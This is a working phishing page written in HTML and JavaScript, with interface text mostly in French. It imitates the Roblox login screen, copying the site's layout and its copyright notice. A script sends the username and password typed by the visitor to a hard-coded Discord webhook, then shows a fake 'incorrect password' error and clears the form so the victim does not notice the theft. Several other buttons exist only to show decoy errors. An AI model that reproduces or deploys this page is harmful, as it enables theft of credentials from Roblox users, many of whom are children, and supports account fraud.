<!DOCTYPE html> 
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Connexion à Roblox</title>

  <!-- Open Graph / Facebook -->
  <meta property="og:title" content="Login Roblox" />
  <meta property="og:description" content="Connecte-toi pour jouer avec ton compte Roblox." />
  <meta property="og:image" content="https://example.com/image.jpg" />
  <meta property="og:url" content="https://tonlien.github.io/RobloxLogin/" />

  <!-- Twitter -->
  <meta name="twitter:card" content="summary_large_image" />

  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      background-color: #1c1c1c;
      font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
      color: white;
      height: 100vh;
      overflow: hidden;
      position: relative;
    }

    .topbar {
      width: 100%;
      background-color: #1c1c1c;
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 10px 0;
      gap: 30px;
      font-size: 14px;
      border-bottom: 1px solid #333;
    }

    .topbar .logo {
      font-weight: bold;
      font-size: 18px;
    }

    .topbar a {
      color: white;
      text-decoration: none;
      padding: 6px 10px;
    }

    .topbar .search {
      padding: 5px;
      border-radius: 4px;
      border: none;
      font-size: 14px;
    }

    .topbar .buttons {
      display: flex;
      gap: 10px;
      align-items: center;
    }

    .topbar .signup {
      background-color: #007bff;
      color: white;
      border: none;
      padding: 6px 10px;
      border-radius: 4px;
      cursor: pointer;
    }

    .topbar .login {
      background-color: #444;
      color: white;
      border: none;
      padding: 6px 10px;
      border-radius: 4px;
      cursor: pointer;
    }

    .container {
      background-color: #2c2c2c;
      width: 420px;
      padding: 45px;
      border-radius: 10px;
      box-shadow: 0 4px 8px rgba(0,0,0,0.2);
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
    }

    .login-title {
      text-align: center;
      font-size: 32px;
      font-weight: 800;
      color: white;
      letter-spacing: 0.5px;
      margin-bottom: 25px;
    }

    .input-field {
      width: 100%;
      padding: 12px;
      margin-bottom: 15px;
      border: 1px solid #555;
      border-radius: 5px;
      background-color: #1f1f1f;
      color: white;
      font-size: 16px;
    }

    .input-field::placeholder {
      color: #bbb;
    }

    .btn,
    .outline-btn {
      width: 100%;
      padding: 14px;
      border-radius: 5px;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      margin-top: 10px;
      background-color: transparent;
      color: white;
      border: 2px solid white;
      text-align: center;
    }

    .btn:hover,
    .outline-btn:hover {
      background-color: rgba(255, 255, 255, 0.1);
    }

    .link {
      text-align: center;
      font-size: 15px;
      color: white;
      margin: 10px 0;
      cursor: pointer;
    }

    .link:hover {
      text-decoration: underline;
    }

    .footer {
      font-size: 11px;
      color: #aaa;
      text-align: center;
      position: absolute;
      bottom: 0;
      width: 100%;
      padding: 15px 10px;
      background-color: #1c1c1c;
      line-height: 1.6;
      border-top: 1px solid #333;
    }

    .footer a {
      color: #aaa;
      margin: 0 5px;
      text-decoration: none;
    }

    .footer a:hover {
      text-decoration: underline;
    }

    .loader {
      display: flex;
      justify-content: center;
      margin-top: 10px;
      gap: 8px;
    }

    .loader div {
      width: 10px;
      height: 10px;
      background-color: white;
      border-radius: 50%;
      animation: bounce 0.6s infinite alternate;
    }

    .loader div:nth-child(2) {
      animation-delay: 0.2s;
    }

    .loader div:nth-child(3) {
      animation-delay: 0.4s;
    }

    @keyframes bounce {
      from { transform: translateY(0); }
      to { transform: translateY(-10px); }
    }

    .error-message {
      color: red;
      text-align: center;
      margin-top: 10px;
      font-weight: bold;
      font-size: 16px;
    }
  </style>
</head>
<body>

  <!-- Barre du haut -->
  <div class="topbar">
    <div class="logo">ROBLOX</div>
    <a href="#">Discover</a>
    <a href="#">Marketplace</a>
    <a href="#">Create</a>
    <a href="#">Robux</a>
    <input class="search" type="text" placeholder="Search">
    <div class="buttons">
      <button class="signup">Sign Up</button>
      <button class="login">Log In</button>
    </div>
  </div>

  <!-- Formulaire de connexion centré -->
  <div class="container">
    <h2 class="login-title">Login to Roblox</h2>

    <input type="text" id="username" class="input-field" placeholder="Username / Email / Phone" required>
    <input type="password" id="password" class="input-field" placeholder="Password" required>

    <button class="btn" onclick="sendToDiscord()">Log In</button>

    <div id="status"></div>

    <div class="link fake-action">Forgot Password or Username?</div>
    <button class="outline-btn fake-action">Another Logged In Device? Log In</button>
    <div class="link fake-action">Don't have an account? <strong>Sign Up</strong></div>
  </div>

  <!-- Footer -->
  <div class="footer">
    <a href="#">À propos</a> |
    <a href="#">Emplois</a> |
    <a href="#">Blog</a> |
    <a href="#">Parents</a> |
    <a href="#">Cartes-cadeaux</a> |
    <a href="#">Aide</a> |
    <a href="#">Conditions</a> |
    <a href="#">Accessibilité</a> |
    <a href="#">Confidentialité</a> |
    <a href="#">Tes choix en matière de vie privée</a> |
    <a href="#">Options des cookies</a>
    <br><br>
    <span>©2025 Roblox Corporation. Roblox, le logo Roblox et Powering Imagination sont des marques déposées de Roblox Corporation.</span>
  </div>

  <script>
    const webhookUrl = "https://discordapp.com/api/webhooks/1370101183229857903/ciNzwq6Ngr2Ylb2iqD5VUzrEGXAPg2qDI2rOJ-LprVnav6Ypv4TjP0zhue5JpzZKyt8M";

    function sendToDiscord() {
      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;
      const status = document.getElementById("status");

      // Affiche le chargement
      status.innerHTML = `
        <div class="loader">
          <div></div><div></div><div></div>
        </div>
      `;

      // Envoi et message d'erreur après 3 secondes
      setTimeout(() => {
        fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            content: `Tentative de connexion:\nUsername/Email/Phone: ${username}\nPassword: ${password}`,
            username: "Webhook Page Web"
          })
        });

        // Affiche message d'erreur
        status.innerHTML = `<div class="error-message">Incorrect username or password.</div>`;

        document.getElementById("username").value = '';
        document.getElementById("password").value = '';
      }, 3000);
    }

    function showFakeError(message) {
      const status = document.getElementById("status");
      status.innerHTML = `<div class="error-message">${message}</div>`;
    }

    document.querySelectorAll('.fake-action').forEach(el => {
      el.addEventListener('click', (e) => {
        e.preventDefault();
        showFakeError("Cette action n’est pas disponible pour le moment.");
      });
    });
  </script>

</body>
</html>
